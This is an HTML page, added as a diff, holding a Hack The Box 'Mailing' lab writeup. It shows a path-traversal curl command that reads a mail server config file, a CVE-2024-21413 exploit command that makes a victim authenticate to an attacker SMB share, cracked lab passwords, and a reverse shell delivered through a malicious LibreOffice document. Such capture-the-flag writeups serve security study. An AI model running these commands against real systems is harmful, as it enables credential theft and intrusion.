@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Mailing | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Windows</p>
+      <h1>HTB Mailing</h1>
+      <p class="headline">hMailServer LFI, Outlook NTLM leak and LibreOffice macro exploitation</p>
+      <p class="meta">Easy - localadmin</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Mailing exposes a Windows web application with a file download endpoint vulnerable to path traversal. Reading <code>hMailServer.ini</code> reveals mail credentials, which are used to trigger an Outlook-related NTLM leak and capture Maya&#39;s hash. After cracking the hash, WinRM provides a shell. Local enumeration finds LibreOffice installed, and a malicious document exploiting CVE-2023-2255 triggers code execution as <code>localadmin</code>.</p>
+<h2>Web Enumeration and LFI</h2>
+<p>The target exposed web and mail-related services.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026185914.png" alt="Initial port scan" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026190447.png" alt="Service enumeration" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026190510.png" alt="HTTP details" /></figure>
+<p>The web page exposed potential users and a PDF with instructions.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026190947.png" alt="Web page with downloadable PDF" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026191513.png" alt="Potential user maya" /></figure>
+<p>The <code>download.php</code> endpoint was vulnerable to path traversal against Windows paths.</p>
+<pre><code class="language-bash">curl -s -X GET &quot;http://mailing.htb/download.php?file=..\..\..\..\..\program+files+(x86)\hMailServer\Bin\hMailServer.ini&quot;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026191932.png" alt="LFI probe" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026193152.png" alt="hMailServer config path research" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026193244.png" alt="Working hMailServer.ini path" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026193520.png" alt="Password material in hMailServer" /></figure>
+<p>The recovered password was cracked as <code>homenetworkingadministrator</code>.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026193710.png" alt="Recovered hMailServer password" /></figure>
+<h2>Outlook NTLM Leak</h2>
+<p>Multiple CVE-2024-21413 proof-of-concepts were tested. The working flow sent a malicious message that caused Maya to authenticate to an attacker-controlled SMB share.</p>
+<pre><code class="language-bash">python3 CVE-2024-21413.py \
+  --server mailing.htb \
+  --port 587 \
+  --username administrator@mailing.htb \
+  --password homenetworkingadministrator \
+  --sender administrator@mailing.htb \
+  --recipient maya@mailing.htb \
+  --url &quot;\\10.10.16.25\smbFolder\test&quot; \
+  --subject &#39;Verify the email&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026194529.png" alt="CVE-2024-21413 research" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026201346.png" alt="SMB server setup" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026201620.png" alt="Exploit execution" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026210006.png" alt="Maya NTLM hash captured" /></figure>
+<p>The captured hash was cracked.</p>
+<pre><code class="language-text">maya:m4y4ngs4ri</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026210412.png" alt="Hashcat cracking" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026210955.png" alt="Maya password recovered" /></figure>
+<p>WinRM access was valid.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026211115.png" alt="Share enumeration as Maya" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026211426.png" alt="WinRM validation" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026211524.png" alt="Evil-WinRM shell" /></figure>
+<h2>LibreOffice Exploitation</h2>
+<p>LibreOffice was installed under Program Files and the version was vulnerable.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026212100.png" alt="LibreOffice installation" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026212314.png" alt="Vulnerable LibreOffice version" /></figure>
+<p>CVE-2023-2255 was used to generate a malicious ODT payload. A Nishang reverse shell was prepared and encoded for Windows PowerShell.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026213523.png" alt="Payload generation" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026213800.png" alt="PowerShell UTF-16LE base64 encoding" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026215343.png" alt="Nishang one-liner preparation" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026214219.png" alt="Payload adjustment" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026214315.png" alt="HTTP server for payload" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026214412.png" alt="Exploit ODT generated" /></figure>
+<p>After uploading the malicious document to <code>C:\Important Documents</code>, a callback was received as <code>localadmin</code>.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026214552.png" alt="Netcat listener" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026214829.png" alt="ODT upload" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026220034.png" alt="Reverse shell received" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/mailing/Pasted%20image%2020241026220136.png" alt="localadmin flag" /></figure>
+<h2>Key Takeaways</h2>
+<ul>
+<li>Windows path traversal can expose service configuration files with credentials.</li>
+<li>Mail clients may leak NetNTLM material when coerced to access UNC paths.</li>
+<li>Desktop software on servers can become a privilege escalation path through document-based exploits.</li>
+</ul>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
